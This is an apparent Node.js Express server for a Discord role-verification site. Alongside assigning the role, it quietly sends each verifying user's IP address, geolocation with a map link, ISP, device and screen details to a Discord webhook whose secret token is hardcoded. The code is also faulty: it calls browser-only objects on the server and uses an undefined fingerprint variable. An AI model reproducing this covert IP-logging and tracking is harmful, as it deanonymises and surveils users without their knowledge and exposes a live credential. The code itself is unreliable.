const express = require("express");
const cors = require("cors");
const path = require("path");
const { Client, GatewayIntentBits } = require("discord.js");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

// Serve static files from "verify-site"
app.use(express.static(path.join(__dirname, "verify-site")));

// Load environment variables from .env file
const BOT_TOKEN = process.env.BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;
const ROLE_ID = process.env.ROLE_ID;

// Abort if environment variables are missing
if (!BOT_TOKEN || !GUILD_ID || !ROLE_ID) {
  console.error("❌ Missing environment variables. Please check .env file.");
  process.exit(1);
}

// Set up the Discord bot client
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers],
});

client.once("ready", () => {
  console.log(`✅ Bot is ready as ${client.user.tag}`);
});

// API endpoint to verify and assign roles
app.post("/verify", async (req, res) => {
  const { discordID } = req.body;

  // Validate Discord ID
  if (!discordID || !/^\d{17,19}$/.test(discordID)) {
    return res.status(400).json({ success: false, error: "Invalid Discord ID." });
  }

  try {
    const guild = await client.guilds.fetch(GUILD_ID);
    const member = await guild.members.fetch(discordID);

    // Add the role if the member doesn't already have it
    if (!member.roles.cache.has(ROLE_ID)) {
      await member.roles.add(ROLE_ID);
    }

    // Log to Discord webhook (optional)
    logToWebhook(discordID);

    res.status(200).json({ success: true, message: "Role assigned successfully." });
  } catch (err) {
    console.error("❌ Role assignment failed:", err.message);
    res.status(500).json({ success: false, error: "Failed to assign role." });
  }
});

// Function to log to webhook
function logToWebhook(discordID) {
  fetch("https://ipapi.co/json")
    .then((res) => res.json())
    .then((data) => {
      const ip = data.ip || "Unknown";
      const city = data.city || "?";
      const region = data.region || "?";
      const country = data.country_name || "?";
      const lat = data.latitude || "";
      const lon = data.longitude || "";
      const gmap = lat && lon ? `[Open Location](https://www.google.com/maps?q=${lat},${lon})` : "Unavailable";

      const isp = data.org || "Unknown";
      const browser = navigator.userAgent;
      const os = navigator.platform;
      const screenRes = `${screen.width}x${screen.height}`;
      const url = window.location.href;
      const referrer = document.referrer || "None";
      const timestamp = `<t:${Math.floor(Date.now() / 1000)}:F>`;

      const webhookURL = "https://discord.com/api/webhooks/1386525604727230635/jkG3BpOmSweK6ihUDmJKDHoSDCrp1F370ThkcgVJUXphNqwsMqsRv_YsyTcb6Pc9vitJ"

      const payload = {
        embeds: [
          {
            title: "🛡️ RevChix Verification Access",
            color: 0x5b4dff,
            fields: [
              { name: "👤 User", value: `<@${discordID}>`, inline: true },
              { name: "🌐 IP", value: `||\`${ip}\`||`, inline: true },
              { name: "📍 Location", value: `${city}, ${region}, ${country}`, inline: true },
              { name: "📡 ISP", value: `${isp}`, inline: true },
              { name: "🧠 Fingerprint", value: `${fingerprint}`, inline: false },
              { name: "🖥️ Device", value: `${browser} on ${os}`, inline: false },
              { name: "📺 Screen", value: `${screenRes}`, inline: true },
              { name: "🕒 Time", value: `${timestamp}`, inline: false },
              { name: "🔗 URL", value: `${url}`, inline: false },
              { name: "↩️ Referrer", value: `${referrer}`, inline: false },
              { name: "🗺️ Approx. Map", value: gmap, inline: false },
            ],
          },
        ],
      };

      // Send to Discord webhook
      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    });
}

// Serve the verify page (index.html)
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "verify-site", "index.html"));
});

// Start the server and login to Discord
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
  client.login(BOT_TOKEN);
});
